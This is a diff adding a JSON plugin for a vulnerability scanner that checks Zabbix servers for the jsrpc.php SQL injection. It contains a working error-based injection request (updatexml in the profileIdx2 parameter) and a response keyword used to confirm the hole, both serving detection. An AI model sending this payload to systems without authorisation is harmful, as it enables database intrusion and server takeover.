@@ -1,0 +1,18 @@
+{
+    "info": "攻击者通过此漏洞可获取管理员权限登陆后台，后台存在执行命令功能，导致服务器被入侵控制。",
+    "source": 1,
+    "name": "zabbix jsrpc SQL注入",
+    "keyword": "tag:zabbix",
+    "level": "高危",
+    "url": "https://github.com/Medicean/VulApps/tree/master/z/zabbix/1",
+    "author": "wolf@YSRC",
+    "type": "SQL注入",
+    "plugin": {
+        "url": "/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,md5(0x36),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17",
+        "tag": "POC：/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1 or updatexml(1,md5(0x36),1) or 1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17",
+        "analyzing": "keyword",
+        "analyzingdata": "c5a880faf6fb5e6087eb1b2dc",
+        "data": "",
+        "method": "GET"
+    }
+}
